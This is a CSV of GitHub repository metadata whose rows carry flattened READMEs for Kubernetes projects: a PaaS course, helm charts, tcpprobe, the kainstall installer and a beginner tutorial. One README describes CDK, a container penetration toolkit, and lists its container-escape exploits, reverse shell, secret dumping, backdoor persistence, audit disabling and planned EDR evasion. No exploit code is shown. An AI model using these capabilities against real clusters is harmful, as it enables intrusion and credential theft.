owner,repo,topics,readme,created_at,updated_at,language,owner_type,watchers_count,stargazers_count,forks_count,commits_count,default_branch,contributors,contributors_count,releases_count,tags_count,open_issues_count,closed_issues_count,open_pr_count,closed_pr_count
ben1234560,k8s_PaaS,,k8sPaaS image https img shields io badge google kubernetes blue svg https kubernetes io image https img shields io badge ctripcorp apollo gray svg https github com ctripcorp apollo image https img shields io badge CNCD Spinnaker skyblue svg https www spinnaker io image https img shields io badge JAVA Jenkins orange svg https jenkins io zh image https img shields io badge Git Gitee red svg https gitee com image https img shields io badge Git GitLab orange svg image https img shields io badge Apache zookeeper Crimson svg http zookeeper apache org image https img shields io badge used Harbor green svg https goharbor io image https img shields io badge used docker blue svg https www docker com image https img shields io badge used Prometheus red svg https prometheus io image https img shields io badge used etcd blue svg https etcd io image https img shields io badge used Grafana orange svg https grafana com K8SPaaS DevOps K8SdashboardHarborJenkinsgitlabApollopromtheusgrafanaspinnaker 80 WHAT WHY HOW 1 PaaS K8SPaaS assets K8SPaaS png K8S Features WHATWHY https pan baidu com s 1arE2LdtAbcR80gmIQtIELw ouy1 4Q A48G Docker Docker docker Dockerhub Docker docker dockerfile K8S K8Sbind9DNS K8S K8Sdocker K8Sharbor etcd API server L4 controller managerv k8s flanneld flannelSNAT coredns K8Singress dashboardk8s dashboard K8S dashboardheapster K8S K8SCI CD zookeeper Jenkins maven dubbo Jenkinsdubbo BlueOceanJenkins dubbo monitork8s dubbo K8S K8SApollo configmap Apollo ConfigServiceK8S Apollo ConfigServiceIP Apollo Portal Portaldocker dubboApollo dubboApollo Apollodubbo Apollo configservice ApollodubboApollo portaladminservice dubboApollo Promtheusk8s Prometheus kube state metric node exporter cadvisor blackbox exporter Prometheus server Prometheus Grafana alertmanager alertmanager K8SdubboELK tomcat tomcatdubboK8S elasticsearch kafkakafka manager filebeatdubbo logstash kibanaK8S Kibana spinaker SpinnakerAmory redis clouddriver spinnaker spinnakerJenkins spinnakerdubboK8S spinnakerdubboK8S kubernetes https time geekbang org column intro 116 Docker K8S1 https www luffycity com home Email909336740 qq com PS,2020-09-12T05:57:42Z,2020-12-29T06:29:04Z,Shell,User,56,601,200,141,master,ben1234560,1,0,0,0,0,0,0
k8s-at-home,charts,charts#helm#k8s#kubernetes,k8s Home collection of helm charts License https img shields io badge License Apache 202 0 blue svg https opensource org licenses Apache 2 0 https github com k8s at home charts workflows Release 20Charts badge svg branch master https github com k8s at home charts actions pre commit https img shields io badge pre commit enabled brightgreen logo pre commit logoColor white https github com pre commit pre commit Artifact HUB https img shields io endpoint url https artifacthub io badge repository k8s at home https artifacthub io packages search repo k8s at home Usage Helm https helm sh must be installed to use the charts Please refer to Helm s documentation https helm sh docs to get started Once Helm is set up properly add the repo as follows console helm repo add k8s at home https k8s at home com charts You can then run helm search repo k8s at home to see the charts Charts See artifact hub https artifacthub io packages search org k8s at home for a complete list Contributing See CONTRIBUTING md CONTRIBUTING md License Apache 2 0 License LICENSE,2020-08-29T11:19:21Z,2020-12-29T12:20:57Z,Smarty,Organization,14,243,104,939,master,billimek#renovate[bot]#onedr0p#DirtyCajunRice#carpenike#bjw-s#dcplaya#auricom#WojoInc#mr-onion-2#ishioni#nolte#CuBiC3D#damacus#mkilchhofer#mcmarkj#michaelkoetter#simoncaron#halkeye#Arno500#gandazgul#jwalker343#St0rmingBr4in#mcronce#radum#coldfire84#runecalico#hall#dewet22#w4#iwwwwwwi#patbos#RickCoxDev#tingvarsson#yasn77#dza89#ajc161#lexfrei#zer0tonin#monotek#blakeblackshear#cscheib#MoJo2600#madchr1st#pcheliniy#Feliksas#Gallardo994#LEI#blmhemu#kalinon#fonsecas72#imduffy15#totallyGreg#jacobblock#james-choncholas#jessestuart#angryninja48#PixelJonas#Jonher937#joschi36#blackjid#KamuelaFranco#mcavoyk#squat#ljfranklin#marshallford#farmdawgnation#masantiago#hyperbolic2346#npawelek#eperott#si458#salekseev#stephenliang#tarvip#bezerker#thiemok#WTPascoe#wernerb#WRMilling#lnattrass#nreisbeck#sherbang,83,713,713,22,53,6,371
Xyntax,CDK,docker#escape-container#hacktools#k8s#k8s-penetration-toolkit#kubernetes#linux#penetration#penetration-testing-tools,CDK Zero Dependency Container Penetration Toolkit English https github com Xyntax CDK wiki CDK Home CN png https static cdxy me 20201203170308NwzGiTScreenshot jpeg Legal Disclaimer Usage of CDK for attacking targets without prior mutual consent is illegal CDK is for security testing purposes only Overview CDK is an open sourced container penetration toolkit designed for offering stable exploitation in different slimmed containers without any OS dependency It comes with useful net tools and many powerful PoCs EXPs helps you to escape container and takeover K8s cluster easily Currently still under development submit issues https github com Xyntax CDK issues or mail if you need any help Installation Download latest release in https github com Xyntax CDK releases Drop executable files into target container and start testing Usage Container DucK Zero dependency docker k8s penetration toolkit by Find tutorial configuration and use case in https github com Xyntax CDK wiki Usage cdk evaluate full cdk run list cdk Evaluate cdk evaluate Gather information to find weekness inside container cdk evaluate full Enable file scan during information gathering Exploit cdk run list List all available exploits cdk run Run single exploit docs in https github com Xyntax CDK wiki Tool vi Edit files in container like vi command ps Show process information like ps ef command nc options Create TCP tunnel ifconfig Show network information kcurl get post Make request to K8s api server ucurl get post Make request to docker unix socket probe TCP port scan example cdk probe 10 0 1 0 255 80 8080 9443 50 1000 Options h help Show this help msg v version Show version Features CDK have three modules 1 Evaluate gather information inside container to find potential weakness 2 Exploit for container escaping persistance and lateral movement 3 Tool network tools and APIs for TCP HTTP requests tunnels and K8s cluster management Evaluate Module Usage cdk evaluate full This command will run the scripts below without local file scanning using full to enable all Tactics Script Supported Usage Example Information Gathering OS Basic Info link https github com Xyntax CDK wiki Evaluate System Info Information Gathering Available Capabilities link https github com Xyntax CDK wiki Evaluate Commands and Capabilities Information Gathering Available Linux Commands link https github com Xyntax CDK wiki Evaluate Commands and Capabilities Information Gathering Mounts link https github com Xyntax CDK wiki Evaluate Mounts Information Gathering Net Namespace link https github com Xyntax CDK wiki Evaluate Net Namespace Information Gathering Sensitive ENV link https github com Xyntax CDK wiki Evaluate Services Information Gathering Sensitive Process link https github com Xyntax CDK wiki Evaluate Services Information Gathering Sensitive Local Files link https github com Xyntax CDK wiki Evaluate Sensitive Files Discovery K8s Api server Info link https github com Xyntax CDK wiki Evaluate K8s API Server Discovery K8s Service account Info link https github com Xyntax CDK wiki Evaluate K8s Service Account Discovery Cloud Provider Metadata API link https github com Xyntax CDK wiki Evaluate Cloud Provider Metadata API Exploit Module List all available exploits cdk run list Run targeted exploit cdk run options Tactic Technique CDK Exploit Name Supported Doc Escaping docker runc CVE 2019 5736 runc pwn Escaping docker cp CVE 2019 14271 Escaping containerd shim CVE 2020 15257 shim pwn link https github com Xyntax CDK wiki Exploit shim pwn Escaping dirtycow CVE 2016 5159 Escaping docker sock PoC DIND attack docker sock check link https github com Xyntax CDK wiki Exploit docker sock check Escaping docker sock Backdoor Image Deploy docker sock deploy link https github com Xyntax CDK wiki Exploit docker sock deploy Escaping Device Mount Escaping mount disk link https github com Xyntax CDK wiki Exploit mount disk Escaping Cgroups Escaping mount cgroup link https github com Xyntax CDK wiki Exploit mount cgroup Escaping Procfs Escaping mount procfs link https github com Xyntax CDK wiki Exploit mount procfs Escaping Ptrace Escaping PoC check ptrace link https github com Xyntax CDK wiki Exploit check ptrace Discovery K8s Component Probe service probe link https github com Xyntax CDK wiki Exploit service probe Lateral Movement K8s Service Account Control Lateral Movement Attack K8s api server Lateral Movement Attack K8s Kubelet Lateral Movement Attack K8s Dashboard Lateral Movement Attack K8s Helm Lateral Movement Attack K8s Etcd Lateral Movement Attack Private Docker Registry Remote Control Reverse Shell reverse shell link https github com Xyntax CDK wiki Exploit reverse shell Credential Access Access Key Scanning ak leakage link https github com Xyntax CDK wiki Exploit ak leakage Credential Access Dump K8s Secrets k8s secret dump Credential Access Dump K8s Config k8s configmap dump Persistence Deploy WebShell Persistence Deploy Backdoor Pod Persistence Deploy Shadow K8s api server Persistence Deploy K8s CronJob Defense Evasion Disable K8s Audit Tool Module Running commands like in Linux little different in input args see the usage link cdk nc options cdk ps Command Description Supported Usage Example nc TCP Tunnel link https github com Xyntax CDK wiki Tool nc ps Process Information link https github com Xyntax CDK wiki Tool ps ifconfig Network Information link https github com Xyntax CDK wiki Tool ifconfig vi Edit Files link https github com Xyntax CDK wiki Tool vi kcurl Request to K8s api server link https github com Xyntax CDK wiki Tool kcurl dcurl Request to Docker HTTP API ucurl Request to Docker Unix Socket link https github com Xyntax CDK wiki Tool ucurl rcurl Request to Docker Registry API probe IP Port Scanning link https github com Xyntax CDK wiki Tool probe Developer Docs run test in container https github com Xyntax CDK wiki Run Test TODO 1 Echo loader for delivering CDK into target container via Web RCE 2 EDR defense evasion 3 Compile optimization 4 Dev docs,2020-11-05T09:18:51Z,2020-12-29T12:38:35Z,Go,User,6,229,33,13,main,Xyntax,1,2,2,0,0,0,0
mehrdadrad,tcpprobe,docker#http#http2#https#k8s#kubernetes#monitoring#observability#probe#socket#sre#tcp,tcpprobe docs imgs tplogo png Github Actions https github com mehrdadrad tcpprobe workflows build badge svg https github com mehrdadrad tcpprobe actions query workflow 3Abuild Go report https goreportcard com badge github com mehrdadrad tcpprobe https goreportcard com report github com mehrdadrad tcpprobe Coverage Status https coveralls io repos github mehrdadrad tcpprobe badge svg branch main https coveralls io github mehrdadrad tcpprobe branch main TCPProbe is a modern TCP tool and service for network performance observability It exposes information about sockets underlying TCP session TLS and HTTP more than 60 metrics https github com mehrdadrad tcpprobe wiki metrics you can run it through command line or as a service the request is highly customizable and you can integrate it with your application through gRPC it runs in a Kubernetes cluster as cloud native application and by adding annotations on pods allow a fine control of the probing process Features TCP socket statistics TCP IP request customization Prometheus exporter Probing multiple hosts Runs as service Kubernetes native gRPC interface Documentation Command s options https github com mehrdadrad tcpprobe wiki command s options Service https github com mehrdadrad tcpprobe wiki service Demo https github com mehrdadrad tcpprobe wiki prometheus grafana Metrics https github com mehrdadrad tcpprobe wiki metrics Helm Chart https github com mehrdadrad tcpprobe wiki helm CLI tutorial https github com mehrdadrad tcpprobe wiki command line tutorial gRPC https github com mehrdadrad tcpprobe wiki grpc Command line download Linux binary https github com mehrdadrad tcpprobe releases latest download tcpprobe tcpprobe json https www google com json Target https www google com IP 142 250 72 196 Timestamp 1607567390 Seq 0 State 1 CaState 0 Retransmits 0 Probes 0 Backoff 0 Options 7 Rto 204000 Ato 40000 SndMss 1418 RcvMss 1418 Unacked 0 Sacked 0 Lost 0 Retrans 0 Fackets 0 LastDataSent 56 LastAckSent 0 LastDataRecv 0 LastAckRecv 0 Pmtu 9001 RcvSsthresh 56587 Rtt 1365 Rttvar 446 SndSsthresh 2147483647 SndCwnd 10 Advmss 8949 Reordering 3 RcvRtt 0 RcvSpace 62727 TotalRetrans 0 PacingRate 20765147 BytesAcked 448 BytesReceived 10332 SegsOut 10 SegsIn 11 NotsentBytes 0 MinRtt 1305 DataSegsIn 8 DataSegsOut 3 DeliveryRate 1785894 BusyTime 4000 RwndLimited 0 SndbufLimited 0 Delivered 4 DeliveredCe 0 BytesSent 447 BytesRetrans 0 DsackDups 0 ReordSeen 0 RcvOoopack 0 SndWnd 66816 TCPCongesAlg cubic HTTPStatusCode 200 HTTPRcvdBytes 14683 HTTPRequest 113038 HTTPResponse 293 DNSResolve 2318 TCPConnect 1421 TLSHandshake 57036 TCPConnectError 0 DNSResolveError 0 Docker docker run rm mehrdadrad tcpprobe smtp gmail com 587 Docker Compose TCPProbe and Prometheus docker compose up d Open your browser and try http localhost 9090 You can edit the docker compose yml to customize the options and target s Helm Chart Detailed installation instructions for TCPProbe on Kubernetes are found here https github com mehrdadrad tcpprobe wiki helm helm install tcpprobe tcpprobe License This project is licensed under MIT license Please read the LICENSE file Contribute Welcomes any kind of contribution please follow the next steps Fork the project on github com Create a new branch Commit changes to the new branch Send a pull request,2020-10-26T00:27:20Z,2020-12-27T11:47:13Z,Go,User,4,153,6,109,main,mehrdadrad#brownchow,2,3,3,0,0,0,1
lework,kainstall,bash#install#kainstall#kubeadm#kubeadmin-kubernetes#kubernetes#kubernetes-cluster#kubernetes-install#kubernetes-setup,kainstall kubeadm install kubernetes GitHub Super Linter https github com lework kainstall workflows Lint 20Code 20Base badge svg https github com marketplace actions super linter shell kubeadm kubernetes Ansible PlayBook Ansible PlayBook Python Ansible yaml Kubernetes HA shell shell 100 KB OS centos 7 x x64 centos 8 x x64 CPU 2C MEM 4G kube docker k8s node ha images k8s node ha png https lework github io 2019 10 01 kubeadm install https lework github io 2019 10 01 kubeadm install selinux swap firewalld epel limits history journal chrony ssh login info audit ipvs docker kube kubernetes ingress nginx traefik network flannel calico monitor prometheus log elasticsearch storage rook longhorn web ui dashboard kubesphere addon metrics server nodelocaldns kubernetes etcd sudo 10 kainstall common docker ce https github com docker docker ce latest docker ce release https img shields io github v release docker docker ce sort semver common kubernetes https github com kubernetes kubernetes latest kubernetes release https img shields io github v release kubernetes kubernetes sort semver network flannel https github com coreos flannel 0 13 0 flannel release https img shields io github v release coreos flannel network calico https github com projectcalico calico 3 17 1 calico release https img shields io github v release projectcalico calico sort semver addons metrics server https github com kubernetes sigs metrics server 0 4 1 metrics server release https img shields io github v release kubernetes sigs metrics server addons nodelocaldns https github com kubernetes dns tree master cmd node cache 1 16 0 1 16 0 ingress ingress nginx controller https github com kubernetes ingress nginx 0 41 2 ingress nginx release https img shields io github v release kubernetes ingress nginx sort semver ingress traefik https github com traefik traefik 2 3 6 traefik release https img shields io github v release traefik traefik sort semver monitor kubeprometheus https github com prometheus operator kube prometheus 0 7 0 kube prometheus release https img shields io github v release prometheus operator kube prometheus log elasticsearch https github com elastic elasticsearch 7 10 1 elasticsearch release https img shields io github v release elastic elasticsearch sort semver storage rook https github com rook rook 1 5 4 rook release https img shields io github v release rook rook sort semver storage longhorn https github com longhorn longhorn 1 1 0 longhorn release https img shields io github v release longhorn longhorn sort semver ui kubernetesdashboard https github com kubernetes dashboard 2 1 0 kubernetes dashboard release https img shields io github v release kubernetes dashboard sort semver ui kubesphere https github com kubesphere kubesphere 3 0 0 kubesphere release https img shields io github v release kubesphere kubesphere sort semver kube version https lework github io 2020 09 26 kainstall https lework github io 2020 09 26 kainstall bash wget https cdn jsdelivr net gh lework kainstall master kainstall sh bash bash kainstall sh Install kubernetes cluster using kubeadm Usage kainstall sh command Available Commands init Init Kubernetes cluster reset Reset Kubernetes cluster add Add nodes to the cluster del Remove node from the cluster renew cert Renew all available certificates upgrade Upgrading kubeadm clusters update Update script file Flag m master master node default w worker work node default u user ssh user default root p password ssh password private key ssh private key P port ssh port default 22 v version kube version default latest n network cluster network choose flannel calico default flannel i ingress ingress controller choose nginx traefik default nginx ui ui cluster web ui choose dashboard kubesphere default dashboard a addon cluster add ons choose metrics server nodelocaldns default metrics server M monitor cluster monitor choose prometheus l log cluster log choose elasticsearch s storage cluster storage choose rook longhorn U upgrade kernel upgrade kernel of offline file specify the offline package file to load 10years the certificate period is 10 years sudo sudo mode sudo user sudo user sudo password sudo user password Example init cluster kainstall sh init master 192 168 77 130 192 168 77 131 192 168 77 132 worker 192 168 77 133 192 168 77 134 192 168 77 135 user root password 123456 version 1 19 3 reset cluster kainstall sh reset user root password 123456 add node kainstall sh add master 192 168 77 140 192 168 77 141 worker 192 168 77 143 192 168 77 144 user root password 123456 version 1 19 3 del node kainstall sh del master 192 168 77 140 192 168 77 141 worker 192 168 77 143 192 168 77 144 user root password 123456 other kainstall sh renew cert user root password 123456 kainstall sh upgrade version 1 19 3 user root password 123456 kainstall sh update kainstall sh add ingress traefik kainstall sh add monitor prometheus kainstall sh add log elasticsearch kainstall sh add storage rook kainstall sh add ui dashboard kainstall sh add addon nodelocaldns bash bash kainstall sh init master 192 168 77 130 192 168 77 131 192 168 77 132 worker 192 168 77 133 192 168 77 134 user root password 123456 port 22 version 1 20 1 export MASTERNODES 192 168 77 130 192 168 77 131 192 168 77 132 export WORKERNODES 192 168 77 133 192 168 77 134 export SSHUSER root export SSHPASSWORD 123456 export SSHPORT 22 export KUBEVERSION 1 20 1 bash kainstall sh init ingress nginx ui dashboard bash bash c curl sSL https cdn jsdelivr net gh lework kainstall master kainstall sh init master 192 168 77 130 192 168 77 131 192 168 77 132 worker 192 168 77 133 192 168 77 134 user root password 123456 port 22 version 1 20 1 k8s master ssh bash master bash kainstall sh add master 192 168 77 135 worker bash kainstall sh add worker 192 168 77 134 bash kainstall sh add master 192 168 77 135 192 168 77 136 worker 192 168 77 137 192 168 77 138 k8s master ssh bash master bash kainstall sh del master 192 168 77 135 worker bash kainstall sh del worker 192 168 77 134 bash kainstall sh del master 192 168 77 135 192 168 77 136 worker 192 168 77 137 192 168 77 138 bash bash kainstall sh reset user root password 123456 port 22 k8s master ssh cpu 2C4G bash nginx ingress bash kainstall sh add ingress nginx prometheus bash kainstall sh add monitor prometheus elasticsearch bash kainstall sh add log elasticsearch rook bash kainstall sh add storage rook nodelocaldns bash kainstall sh add addon nodelocaldns bash kainstall sh upgrade version 1 20 1 bash kainstall sh renew cert debug DEBUG 1 bash kainstall sh bash kainstall sh update environment configuration bash DOCKERVERSION DOCKERVERSION latest KUBEVERSION KUBEVERSION latest FLANNELVERSION FLANNELVERSION 0 13 0 METRICSSERVERVERSION METRICSSERVERVERSION 0 4 1 INGRESSNGINX INGRESSNGINX 0 41 2 TRAEFIKVERSION TRAEFIKVERSION 2 3 6 CALICOVERSION CALICOVERSION 3 17 1 KUBEPROMETHEUSVERSION KUBEPROMETHEUSVERSION 0 7 0 ELASTICSEARCHVERSION ELASTICSEARCHVERSION 7 10 1 ROOKVERSION ROOKVERSION 1 5 4 LONGHORNVERSION LONGHORNVERSION 1 1 0 KUBERNETESDASHBOARDVERSION KUBERNETESDASHBOARDVERSION 2 1 0 KUBESPHEREVERSION KUBESPHEREVERSION 3 0 0 KUBEDNSDOMAIN KUBEDNSDOMAIN cluster local KUBEAPISERVER KUBEAPISERVER apiserver KUBEDNSDOMAIN KUBEPODSUBNET KUBEPODSUBNET 10 244 0 0 16 KUBESERVICESUBNET KUBESERVICESUBNET 10 96 0 0 16 KUBEIMAGEREPO KUBEIMAGEREPO registry aliyuncs com k8sxio KUBENETWORK KUBENETWORK flannel KUBEINGRESS KUBEINGRESS nginx KUBEMONITOR KUBEMONITOR prometheus KUBESTORAGE KUBESTORAGE rook KUBELOG KUBELOG elasticsearch KUBEUI KUBEUI dashboard KUBEADDON KUBEADDON metrics server KUBEFLANNELTYPE KUBEFLANNELTYPE vxlan masterworker MASTERNODES MASTERNODES WORKERNODES WORKERNODES MGMTNODE MGMTNODE 127 0 0 1 SSHUSER SSHUSER root SSHPASSWORD SSHPASSWORD SSHPRIVATEKEY SSHPRIVATEKEY SSHPORT SSHPORT 22 SUDOUSER SUDOUSER root HOSTNAMEPREFIX HOSTNAMEPREFIX k8s GITHUBPROXY GITHUBPROXY https gh lework workers dev GCRPROXY GCRPROXY k8sgcr lework workers dev SKIPUPGRADEPLAN SKIPUPGRADEPLAN false tar https lework github io 2020 10 18 kainstall offline https lework github io 2020 10 18 kainstall offline 1 bash wget http kainstall oss cn shanghai aliyuncs com 1 20 1 centos7 tgz kainstall offline https github com lework kainstall offline 2 offline file bash bash kainstall sh init master 192 168 77 130 192 168 77 131 192 168 77 132 worker 192 168 77 133 192 168 77 134 version 1 20 1 offline file centos7 tgz 3 offline file bash bash kainstall sh add master 192 168 77 135 worker 192 168 77 136 version 1 20 1 offline file centos7 tgz sudo sudo bash useradd test passwd test stdin 12345678 echo test ALL ALL ALL etc sudoers sudo sudo sudo sudo user sudo root sudo password sudo bash bash kainstall sh init master 192 168 77 130 192 168 77 131 192 168 77 132 worker 192 168 77 133 192 168 77 134 user test password 12345678 port 22 version 1 20 1 sudo sudo user root sudo password 12345678 bash kainstall sh add master 192 168 77 135 worker 192 168 77 136 user test password 12345678 port 22 version 1 20 1 sudo sudo user root sudo password 12345678 bash kainstall sh update 10 kubeadm certs https github com lework kubeadm certs kubeadm kubeadm 1 10 10years kubeadm 10 years bash bash kainstall sh init master 192 168 77 130 192 168 77 131 192 168 77 132 worker 192 168 77 133 192 168 77 134 user root password 123456 port 22 version 1 20 1 10years bash kainstall sh add master 192 168 77 135 worker 192 168 77 136 user root password 123456 port 22 version 1 20 1 10years QQ https qm qq com cgi bin qm qr k HwpkLUcmroLKNv37TlrHY D3SXuLKMOd jumpfrom webapi https leops cn topics node51 License MIT,2020-09-18T09:47:29Z,2020-12-29T09:04:52Z,Shell,User,3,150,46,65,master,lework,1,3,3,2,0,0,0
r0hi7,k8s-In-30Mins,hacktoberfest#kubectl#kubernetes#kubernetes-cluster#kubernetes-learning#kubernetes-pods#kubernetes-resource#stateful-workloads#stateless-workloads,K8s in 30 mins This is not a comprehensive guide to learn Kubernetes from scratch rather this is just a small guide cheat sheet to quickly setup and run applications with Kubernetes and deploy a very simple application on single workload VM This repo can be served as quick learning manual to understand Kubernetes Prerequisite Linux https files fosswire com 2007 08 fwunixref pdf Dockers https docs docker com develop YAML https docs ansible com ansible latest referenceappendices YAMLSyntax html Table of Contents 1 Setting up Kubernetes cluster in VM NOT MINIKUBE Setting up Kubernetes cluster in VM 1 VM cluster Spining up a virtual machine with Vagrant https www vagrantup com docs installation 2GB RAM 2CPU cores at least Understanding What are kube kubeadm kubelet kubectl 1 Kuberenetes pods Kubernetes pods How are they different than Docker containers Moving from Docker container to Kubernetes pods how to create a pod 1 Kubernetes Resource kubernetes resources Pods pods Deployment deployments Replicaset replicasets Services services LoadBalancer Service loadbalancer service 1 Kubernetes network manager kubernetes network manager I will pick up the plugin called Flannel https github com coreos flannel flannel 1 Stateless Workload stateless workloads Replicasets Deployments 1 Stateful Workloads stateful workloads Persistent Volumes persistent volumes Persistent Volume Claims persistent volume claims 1 Deploying End to End Service in Kubernetes cluster sample application example MySQL mysql resource PV step 1 create pv for mysql db PVC step 2 create pvc for pv Deployment step 3 create mysql deployment spec Service step 4 expose mysql server via service Sprinboot Application springboot application Stateless Workload Custom Docker Image files Dockerfile Replica based Deployment link with DB Service step 1 build and deploy appserver Access Springboot Service outside Pods step 2 expose appserver service via service type lb to host Infrastructure as a Code Infrastructure as a code MySQL Full Spec mysql full spec AppServer Full Spec appserver full spec 1 Understanding advance kubernetes resources advance kubernetes resources Namespaces namespaces Create Namespace and Add Resource creating namespace adding resource Context context 1 Cheat sheet cheat sheet 1 Next steps next steps Setting up Kubernetes cluster in VM 1 Download the Vagrant File Vagrantfile 1 Download Virtual box and install from here https www virtualbox org 1 Download and install Vagrant https www vagrantup com downloads 1 In the terminal run the two command to get the VM up and running with out any configuration smile bash In the same directory where you have downloaded Vagrantfile run vagrant up vagrant ssh This will download the Ubuntu box image and do the entire setup for you with the help of virtual box It just need virtual box installed 1 The Vagrantfile comes preconfigured with kubeadm kubelet kubectl 1 Check if kubernetes cluster is perfectly installed bash root vagrant home vagrant kubectl version o json clientVersion major 1 minor 19 gitVersion v1 19 2 gitCommit f5743093fd1c663cb0cbc89748f730662345d44d gitTreeState clean buildDate 2020 09 16T13 41 02Z goVersion go1 15 compiler gc platform linux amd64 serverVersion major 1 minor 19 gitVersion v1 19 2 gitCommit f5743093fd1c663cb0cbc89748f730662345d44d gitTreeState clean buildDate 2020 09 16T13 32 58Z goVersion go1 15 compiler gc platform linux amd64 1 Start the Kubernetes cluster master node bash This will spin up Kubernetes cluster with CIDR 10 244 0 0 16 root vagrant home vagrant kubeadm init pod network cidr 10 244 0 0 16 kubeadm join 10 0 2 15 6443 token 3m5dsc toup1iv7670ya7wc discovery token ca cert hash sha256 73f4983d43f9618522eaccf014205f969e3bacd76c98dd0c root vagrant home vagrant mkdir p HOME kube root vagrant home vagrant sudo cp i etc kubernetes admin conf HOME kube config root vagrant home vagrant sudo chown id u id g HOME kube config 1 Conenct other VM to this cluster Not required in case of single VM cluster For this run perfectly make sure VM to VM connectivity is there All there kube are installed in VM bash kubeadm join 10 0 2 15 6443 token 3m5dsc toup1iv7670ya7wc discovery token ca cert hash sha256 73f4983d43f9618522eaccf014205f969e3bacd76c98dd0c 1 At this point Kubernetes is installed and cluster master is up but still we need a agent to provision and manager network for new nodes for us This is where Flannel https github com coreos flannel flannel comes to rescue Install Flannel to manager docker network for pods bash kubectl apply f https raw githubusercontent com coreos flannel master Documentation kube flannel yml 1 This step applies if we wish to use our master node as worker as well Which is yes in our case root vagrant home vagrant kubectl taint nodes hostname node role kubernetes io master NoSchedule If everything goes well you will see something like this root vagrant home vagrant kubectl get node NAME STATUS ROLES AGE VERSION vagrant Ready master 3m40s v1 19 2 Run all the commands from root shell What are kube Kubernetes runs in client server model similar to the way the docker runs Kubernetes server exposes kubernetes api and each of kubeadm kubelet and kubectl connect with this kubernetes server api to get the task done In the master slave model there are two entities Control Plane Worker Nodes Control Plane Connects with Worker nodes for resource allocation Worker nodes Cluster entitiy that actually allocates tasks and run Pods 1 kubeadm Sets up the cluster Connect various worker nodes togather 2 kubectl It is a client cli Connects with control plane kubernetes api server and send execution requests to control plane 3 kubelet Receives request from control planes Runs in Worker nodes Runs task over worker nodes Maintain Pod lifecycle Not just for pods but all Kubernetes resources lifecycle Kubernetes pods Pods run multiple containers Pods abstract out multilpe containers into single unit If two service in pods are both exposing service on same port the other one wont spin up and it will fail The unit of Kubernetes work load is called Pod How to create a pod You can create a simple nginx pod with following yaml spec Save this in file name pod yml files pod yml yaml apiVersion v1 kind Pod metadata name nginx spec containers name nginx image nginx Key name Key Description apiVersion Kubernetes server API kind Kubernetes Resource type Pod metadata name Name of Kubernetes Pod spec container name Name of Container which will run in a Pod spec container name Name of docker image to run Run this Pod spec with kubectl apply f pod yml bash root vagrant home vagrant kubedata kubectl apply f pod yaml pod nginx created If everything goes OK you will se something like this root vagrant home vagrant kubedata kubectl get pods NAME READY STATUS RESTARTS AGE nginx 1 1 Running 0 43s root vagrant home vagrant kubedata Use kubectl get pods to get the list of all Pods 1 Running command into container running inside Pod kubectl exec it c root vagrant home vagrant kubedata kubectl exec it nginx c nginx whoami root root vagrant home vagrant kubedata kubectl exec it nginx c nginx bin sh cat etc release PRETTYNAME Debian GNU Linux 10 buster NAME Debian GNU Linux VERSIONID 10 VERSION 10 buster VERSIONCODENAME buster ID debian HOMEURL https www debian org SUPPORTURL https www debian org support BUGREPORTURL https bugs debian org 1 Running multiple container in one pod yaml apiVersion v1 kind Pod metadata name nginx spec containers name nginx image nginx name curl image appropriate curl stdin true tty true command bin sh Save this into pod with two containers yml files pod with two containers yml Run this kubectl apply f pod with two containers yml 1 Delete a running pod kubectl delete f pod with two containers yml This will remove the pod mentioned in spec file 1 Container in a Pod can connect to another container in same pod with spec containers name bash root vagrant home vagrant kubedata kubectl exec it nginx c curl bin sh curl nginx Welcome to nginx body width 35em margin 0 auto font family Tahoma Verdana Arial sans serif Welcome to nginx If you see this page the nginx web server is successfully installed and working Further configuration is required For online documentation and support please refer to nginx org Commercial support is available at nginx com Thank you for using nginx Kubernetes Resources Pods Fundamental unit of k8s cluster Abstraction for container multiple containers running under single name Discussed in detail here how to create a pod Deployments A Deployment provides declarative updates for Pods The configuration state in yml file defines how the pods will run in cluster They can specify Replicas Resource allocation Connection with Volumes etc We will see example once we see replicasets replicasets Replicasets 1 Run deployments in replicas 2 Create file files deployment replica yml with following specification yaml apiVersion apps v1 kind Deployment metadata name nginx spec replicas 3 selector matchLabels app nginx app template metadata labels app nginx app spec containers name nginx image nginx Notice the difference diff kind Pod kind Deployment spec replicas 3 selector matchLabels app nginx app 3 Remove existing pods if any kubectl delete pods all and create deployment bash root vagrant home vagrant kubedata kubectl apply f deployment replica yml deployment apps nginx created root vagrant home vagrant kubedata kubectl get deployments NAME READY UP TO DATE AVAILABLE AGE nginx 0 3 3 0 7s root vagrant home vagrant kubedata kubectl get deployments w NAME READY UP TO DATE AVAILABLE AGE nginx 1 3 3 1 14s nginx 2 3 3 2 20s 4 Get the list of all deployments kubectl get deployments or kubectl get deploy 4 Get the list of all replicaset kubectl get replicaset or kubectl get rs bash root vagrant home vagrant kubedata kubectl get pods NAME READY STATUS RESTARTS AGE nginx d6ff45774 f84l8 1 1 Running 0 4m59s nginx d6ff45774 gzxfz 1 1 Running 0 4m59s nginx d6ff45774 t69mw 1 1 Running 0 4m59s root vagrant home vagrant kubedata kubectl get deploy NAME READY UP TO DATE AVAILABLE AGE nginx 3 3 3 3 162m root vagrant home vagrant kubedata kubectl get replicaset NAME DESIRED CURRENT READY AGE nginx d6ff45774 3 3 3 162m root vagrant home vagrant kubedata 5 Print a detailed description of the selected resources including related resources such as events or controllers kubectl describe 6 Get deployment configuration in JSON format kubectl get deployment nginx o yaml Services Logical abstraction of Pods and policies to access them They enable loose coupling between dependent Pods e g Open Ports Security Policies between Pod interaction etc Can be created independent of Pod declaration but usually services linked to one Pod are present in same spec file Lets create a simple service to expose nginx service port to host machine File files nginx service yml yaml apiVersion apps v1 kind Deployment metadata name nginx spec replicas 3 selector matchLabels app nginx app template metadata labels app nginx app spec containers name nginx image nginx apiVersion v1 kind Service metadata name nginx spec selector app nginx app ports protocol TCP port 80 targetPort 80 Service declaration starts by augmenting exiting deployment pod spec with Service and Pod can share same names Each different resource must have unique amongst themselves The above service exposes port 80 on host specified by spec ports port to port 80 of target pod specified by spec ports taregtPort bash root vagrant home vagrant kubedata kubectl apply f nginx service yml deployment apps nginx unchanged service nginx created root vagrant home vagrant kubedata Once the service is created Run kubectl get services to get the list of services bash root vagrant home vagrant kubedata kubectl get services NAME TYPE CLUSTER IP EXTERNAL IP PORT S AGE kubernetes ClusterIP 10 96 0 1 443 TCP 2d5h nginx ClusterIP 10 104 178 240 80 TCP 49s Cluster IP is the IP interface of Pod anstraction on host curl cluster IP will connect us to the Pod bash root vagrant home vagrant kubedata curl 10 104 